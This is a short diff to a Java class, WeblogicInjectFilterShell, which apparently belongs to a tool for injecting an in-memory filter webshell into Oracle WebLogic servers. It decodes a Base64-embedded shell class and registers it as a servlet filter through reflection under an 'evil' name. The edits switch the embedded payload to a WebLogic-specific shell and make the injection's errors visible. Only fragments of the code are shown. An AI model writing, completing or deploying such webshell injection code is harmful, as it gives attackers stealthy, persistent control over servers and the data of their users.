@@ -8,7 +8,7 @@ import java.util.Base64;
 import java.util.Map;
 
 public class WeblogicInjectFilterShell {
-    public static byte[] codeClass = Base64.getDecoder().decode(classCache.DynamicFilterShell.getBytes());
+    public static byte[] codeClass = Base64.getDecoder().decode(classCache.WeblogicFilterShell.getBytes());
 
     static {
         try {
@@ -56,7 +56,7 @@ public class WeblogicInjectFilterShell {
                 registerFilterM.invoke(filterManager, evilName, filterName, url, null, null, null);
             }
         } catch (Exception e) {
-            //pass
+            e.printStackTrace();
         }
     }
 }
